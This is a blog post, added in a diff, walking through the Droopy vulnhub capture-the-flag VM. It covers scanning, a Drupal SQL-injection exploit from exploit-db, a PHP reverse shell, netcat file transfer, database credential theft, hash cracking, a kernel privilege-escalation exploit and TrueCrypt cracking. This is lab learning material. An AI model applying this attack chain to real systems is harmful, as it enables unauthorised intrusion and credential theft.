@@ -1,0 +1,239 @@
+---
+layout: post
+title: Walkthrough Droopy
+date: 2016-05-01 22:35:02.000000000 -03:00
+type: post
+published: true
+status: publish
+categories: []
+tags:
+- CTF
+- pen-testing
+- vulnhub
+- wargames
+meta:
+  _oembed_295f2e401072a55fcfde7d157936cd11: "{{unknown}}"
+  _oembed_f8e496b4490ca169a2aac8e66bf1a203: "{{unknown}}"
+  _oembed_223cb67f08e4fe58d2fb14513567afec: "{{unknown}}"
+  _oembed_00ea6fc5c32fc718ffb114e79fa4bb44: "{{unknown}}"
+  _oembed_be22842c45f68892efb37cb3ce72109c: "<div class=\"embed-exploitsdatabase\"><blockquote
+    class=\"wp-embedded-content\"><a href=\"https://www.exploit-db.com/search/\">Search
+    the Exploit Database</a></blockquote><script type='text/javascript'><!--//--><![CDATA[//><!--\t\t!function(a,b){\"use
+    strict\";function c(){if(!e){e=!0;var a,c,d,f,g=-1!==navigator.appVersion.indexOf(\"MSIE
+    10\"),h=!!navigator.userAgent.match(/Trident.*rv:11./),i=b.querySelectorAll(\"iframe.wp-embedded-content\");for(c=0;c<i.length;c++)if(d=i[c],!d.getAttribute(\"data-secret\")){if(f=Math.random().toString(36).substr(2,10),d.src+=\"#?secret=\"+f,d.setAttribute(\"data-secret\",f),g||h)a=d.cloneNode(!0),a.removeAttribute(\"security\"),d.parentNode.replaceChild(a,d)}else;}}var
+    d=!1,e=!1;if(b.querySelector)if(a.addEventListener)d=!0;if(a.wp=a.wp||{},!a.wp.receiveEmbedMessage)if(a.wp.receiveEmbedMessage=function(c){var
+    d=c.data;if(d.secret||d.message||d.value)if(!/[^a-zA-Z0-9]/.test(d.secret)){var
+    e,f,g,h,i,j=b.querySelectorAll('iframe[data-secret=\"'+d.secret+'\"]'),k=b.querySelectorAll('blockquote[data-secret=\"'+d.secret+'\"]');for(e=0;e<k.length;e++)k[e].style.display=\"none\";for(e=0;e<j.length;e++)if(f=j[e],c.source===f.contentWindow){if(f.removeAttribute(\"style\"),\"height\"===d.message){if(g=parseInt(d.value,10),g>1e3)g=1e3;else
+    if(200>~~g)g=200;f.height=g}if(\"link\"===d.message)if(h=b.createElement(\"a\"),i=b.createElement(\"a\"),h.href=f.getAttribute(\"src\"),i.href=d.value,i.host===h.host)if(b.activeElement===f)a.top.location.href=d.value}else;}},d)a.addEventListener(\"message\",a.wp.receiveEmbedMessage,!1),b.addEventListener(\"DOMContentLoaded\",c,!1),a.addEventListener(\"load\",c,!1)}(window,document);//--><!]]></script><iframe
+    sandbox=\"allow-scripts\" security=\"restricted\" src=\"https://www.exploit-db.com/search/embed/\"
+    width=\"600\" height=\"338\" title=\"&#8220;Search the Exploit Database&#8221;
+    &#8212; Exploits Database\" frameborder=\"0\" marginwidth=\"0\" marginheight=\"0\"
+    scrolling=\"no\" class=\"wp-embedded-content\"></iframe></div>"
+  _oembed_time_be22842c45f68892efb37cb3ce72109c: '1462134065'
+  _oembed_df45a48439dc71930ccaf11861942bd3: "{{unknown}}"
+  _oembed_31ded274867777d600b678c4b2176981: "{{unknown}}"
+  _oembed_8ad5f0513a256f316989467f400ebf65: "{{unknown}}"
+  _oembed_9f600c7782fc7f1ec59c72fac24326cc: "{{unknown}}"
+  _rest_api_published: '1'
+  _rest_api_client_id: "-1"
+  _publicize_job_id: '22375197352'
+  _oembed_d5f4193a18ac99236fabf8920d85a6dd: "{{unknown}}"
+  _oembed_919903d6cb9c08261a76e425fe9c3935: "{{unknown}}"
+  _oembed_b4b5f7d85f32dc49a3365fca185bafb2: "{{unknown}}"
+  _oembed_87d1b49d81ebb2c811934a599d3d17ea: "{{unknown}}"
+  _oembed_64019a5346e854f76835aa545c3fe9f1: "{{unknown}}"
+  _oembed_4375bb139f28bb1d087c0d2dd0e3f5e6: "{{unknown}}"
+  _oembed_dbd8d2a1485473beb215b5de524fa75b: "{{unknown}}"
+  _oembed_09804befbd6fffe19ce1e9f037b5510b: "{{unknown}}"
+author:
+  login: tidlost
+  email: tl.dr.mfw@gmail.com
+  display_name: tidlost
+  first_name: ''
+  last_name: ''
+---
+<p>Another walkthrough. This time for the Droopy-vm. It can be found here on <a href="https://www.vulnhub.com/entry/droopy-v02,143/">vulnhub.com</a></p>
+<p>I tried out netdiscover, just to learn something new. I have seen that other people use it. It turns out that it works to find hosts on the network. It works by sending out ARP-requests throughout the network and loggin the requests. I am not really sure if nmap is using a different technique. But it is good to know that there is an alternative to nmap for it.</p>
+<p>[code lang="bash"]<br />
+netdiscover -r 192.168.1.0/24<br />
+ Currently scanning: Finished!   |   Screen View: Unique<br />
+Hosts<br />
+ 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120<br />
+ _____________________________________________________________________________<br />
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname<br />
+ -----------------------------------------------------------------------------<br />
+ 192.168.1.1     e8:de:27:31:15:ee      1      60  TP-LINK TECHNOLOGIES CO.,LTD.<br />
+ 192.168.1.104   08:00:27:65:24:9c      1      60  Cadmus Computer Systems<br />
+[/code]</p>
+<p>So I ran nmap.<br />
+[code lang="bash"]<br />
+nmap -vvv -A -T4 -O 192.168.1.104</p>
+<p>PORT   STATE SERVICE REASON         VERSION<br />
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))<br />
+|_http-favicon: Unknown favicon MD5: B6341DFC213100C61DB4FB8775878CEC<br />
+|_http-generator: Drupal 7 (http://drupal.org)<br />
+| http-methods:<br />
+|_  Supported Methods: GET HEAD POST OPTIONS<br />
+| http-robots.txt: 36 disallowed entries<br />
+| /includes/ /misc/ /modules/ /profiles/ /scripts/<br />
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt<br />
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt<br />
+| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php<br />
+| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/<br />
+| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/<br />
+| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/<br />
+|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/<br />
+|_http-server-header: Apache/2.4.7 (Ubuntu)<br />
+|_http-title: Welcome to La fraude fiscale des grandes soci\xC3\xA9t\xC3\xA9s | La fraud...<br />
+MAC Address: 08:00:27:65:24:9C (Oracle VirtualBox virtual NIC)<br />
+Device type: general purpose<br />
+Running: Linux 3.X|4.X<br />
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br />
+OS details: Linux 3.2 - 4.4</p>
+<p>[/code]</p>
+<p>First I thought that the MD5 was a flag or something. But then I read that that is the standard way for nmap to output if it doesn't know the service.</p>
+<p>The robots file is just filled with stuff.</p>
+<p>Among the many files was this.<br />
+http://droopy.dev/CHANGELOG.txt<br />
+ Drupal 7.30, 2014-07-24 </p>
+<p>This reminded me about a huge vulnerability that was in drupal a few years ago, that I had heard about.</p>
+<p>I continued the scanning by running nikto and then checking out the info.php file to see what I could find.</p>
+<p>This is some of all the info.<br />
+[code]<br />
+http://droopy.dev/info.php<br />
+PHP Version 5.5.9-1ubuntu4.5<br />
+Hostname:Port droopy.knight139.co.uk:80<br />
+User/Group www-data(33)/33<br />
+Apache Version Apache/2.4.7 (Ubuntu)<br />
+Loaded Modules core mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php5 mod_rewrite mod_setenvif mod_status </p>
+<p>DOCUMENT_ROOT /var/www/html<br />
+SERVER_ADMIN webmaster@localhost </p>
+<p>Mysql<br />
+Client API version 5.5.40 </p>
+<p>PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br />
+[/code]<br />
+The default apache-page was also found.<br />
+http://droopy.dev/index.html</p>
+<p>I tried to brute-force the login. This made the server block my IP. And I also think I made it run out of memory or something. Because is subsequently crashed. Great. So I restarted the VM fresh again. And this time I checked out the drupal-exploit. </p>
+<p>So I searched for exploits on the <a href="https://www.exploit-db.com/search/?order_by=date&amp;order=desc&amp;pg=1&amp;action=search&amp;description=Drupal">exploits-database.</a><br />
+There I found four exploits that are called something along the lines of: Drupal Core &lt;= 7.32 - SQL Injection.<br />
+Or similar. Two were written in python two in php. I just picked one, and downloaded it and ran it. Which was pretty stupid, because I created, by default in the exploit, a user with the username admin. So I overwrote the original user.<br />
+So once I later gained access, and checked in the database. I only found my own user. Otherwise I would have been able to crack the hash of the original user and that password could have been good to know.</p>
+<p>Anyhow, I gained access and after some googeling I figured out how to allow php in drupal (modules/php-filter). And I uploaded the php-reverse-shell.ph that I found here:<br />
+usr/share/laudanum/php/php-reverse-shell.php</p>
+<h2>Privilege escalation</h2>
+<p>Now I had shell for user: www-data. So I went to /tmp and started netcat to transfer my enumeration-file.<br />
+[code]<br />
+nc -lvp 3333 &gt; enum.sh<br />
+[/code]</p>
+<p>Then I sent the file with:<br />
+[code]<br />
+nc 192.168.1.104 3333 &lt; enum.sh<br />
+[/code]<br />
+Then: chmod +x enum.sh</p>
+<p>Among other things I found:<br />
+[code lang="bash"]<br />
+uid=1000(gsuser) gid=1000(gsuser) groups=1000(gsuser),24(cdrom),30(dip),46(plugdev),110(lpadmin<br />
+hostname is:<br />
+HOSTNAME=dhcppc5<br />
+#In the hosts file I find this.<br />
+127.0.1.1	droopy.knight139.co.uk	droopy<br />
+[/code]</p>
+<p>I remembered that every web-server that runs mysql has the logins for it in some file. So after some snooping-around I found the file:</p>
+<p>[code]<br />
+/var/www/html/sites/default</p>
+<p>$databases = array (<br />
+  'default' =&gt;<br />
+  array (<br />
+    'default' =&gt;<br />
+    array (<br />
+      'database' =&gt; 'drupal',<br />
+      'username' =&gt; 'drupaluser',<br />
+      'password' =&gt; 'nimda',<br />
+      'host' =&gt; 'localhost',<br />
+      'port' =&gt; '',<br />
+      'driver' =&gt; 'mysql',<br />
+      'prefix' =&gt; '',<br />
+    ),<br />
+  ),<br />
+);<br />
+[/code]</p>
+<p>So I log in to mysql.</p>
+<p>[code]<br />
+mysql -u drupaluser -p drupal<br />
+password: nimda</p>
+<p>SHOW tables;</p>
+<p>mysql&gt; SELECT * FROM users;<br />
+SELECT * FROM users;</p>
+<p>$S$DLx/ePXpg18r5tnZs8aHkngNTWpyjyMLvPvC0gdaEjo4agY8Iyym<br />
+[/code]</p>
+<p>So I went here: http://www.onlinehashcrack.com/hash-identification.php#res<br />
+To identify what type of hash it was.</p>
+<p>It turns out it is a SHA-512.<br />
+- SHA-512(Drupal) </p>
+<p>I study the commands of hashcat and found this:</p>
+<p>[code]<br />
+hashcat -m 7900 -a 0 -o found.txt admin.hash /usr/share/hashcat/rules/rockyou-30000.rule<br />
+[/code]<br />
+7900 is the drupal-mode.</p>
+<p>Meanwhile I continue to look around and found an email in /var/spool/mail:</p>
+<p>[code]<br />
+From Dave &lt;dave@droopy.example.com&gt; Wed Thu 14 Apr 04:34:39 2016<br />
+Date: 14 Apr 2016 04:34:39 +0100<br />
+From: Dave &lt;dave@droopy.example.com&gt;<br />
+Subject: rockyou with a nice hat!<br />
+Message-ID: &lt;730262568@example.com&gt;<br />
+X-IMAP: 0080081351 0000002016<br />
+Status: NN</p>
+<p>George,</p>
+<p>   I've updated the encrypted file... You didn't leave any<br />
+hints for me. The password isn't longer than 11 characters<br />
+and anyway, we know what academy we went to, don't you...?</p>
+<p>I'm sure you'll figure it out it won't rockyou too much!</p>
+<p>If you are still struggling, remember that song by The Jam</p>
+<p>Later,<br />
+Dave<br />
+[/code]</p>
+<p>Okay, so it talks about an encrypted file. From a guy named Dave.</p>
+<p>It looks like the encrypted file can be decrypted with a password that is found in the rockyou dictionary.<br />
+We also know that the password is less than 11 characters, and it has something to do with an academy.<br />
+And it is also the name of a song by the Jam. </p>
+<p>So I started listening to some songs by The Jam a start looking for the encrypted file. But I couldn't really find anything useful.</p>
+<p>After some minor cheating I learn that it is a good idea to look for privilege-escalation exploits. So I search exploit-database again and find several exploits. I download this one: https://www.exploit-db.com/exploits/37292/<br />
+Transfered it over to the VM with nc. Then gcc, chmod and execute, and now I am root. BOOM! Fast when stuff just works.</p>
+<p>In /root i found a file called dave.tc.<br />
+After some googeling I found out that .tc probably is a true-crypt file. And after some more googeling I learned that there is a program called truecrack.<br />
+After a lot of struggling I found that with sed we can remove all words in our dictionary that are shorter than 11 characters.</p>
+<p>I did it with this command.<br />
+The -i flag is important. It makes the changes in the current file. Without it nothing happens. As I learned.<br />
+[code]<br />
+sed -i -r '/^.{0,10}$/d' rr.txt<br />
+[/code]<br />
+So now we have a list with 1.8 millions.<br />
+wc -l rr.txt<br />
+1879453 rr.txt</p>
+<p>Then I did<br />
+grep acade rr.txt &gt; rr2.txt</p>
+<p>To get all words containing the work academy. As it was mentioned in the email.</p>
+<p>Then again:<br />
+[code]<br />
+truecrack -t dave.tc -k sha512 -b 8 -w rr2.txt -v </p>
+<p>Found password:		&quot;etonacademy&quot;<br />
+Password length:	&quot;12&quot;<br />
+[/code]</p>
+<p>On this page I learned how to mount a truecrypt-volume. So I did that.<br />
+https://tails.boum.org/doc/encryption_and_privacy/truecrypt/index.en.html</p>
+<p>[code]<br />
+mkdir /media/dave</p>
+<p>mount /dev/mapper/dave /media/dave<br />
+ls /media/dave/<br />
+buller  lost+found  panama<br />
+[/code]</p>
+<p>In the buller dir there is a file called bullingdon-crest.<br />
+https://en.wikipedia.org/wiki/Bullingdon_Club</p>
+<p>Now I get it. The Dave character is David Cameron. And I guess the shares.jpg refers to his corrupt family's holdings in off-shore banks. And the pig in .secret is of course the infamous pig he most likely fucked. And in the .top dir is the flag. Pretty clever ending to a great VM!</p>
+<h2>Conclusion</h2>
+<p>So on this VM I really learned a lot!<br />
+The most important thing I think was: always check the exploit-database!<br />
+All it really took was to search for two exploits to gain root. First to enter drupal-admin and then to elevate to root.</p>
+<p>I really liked it because it felt very real. The drupal and priv-escalation exploits are both very real. Thanks to knightmare for a great VM!</p>
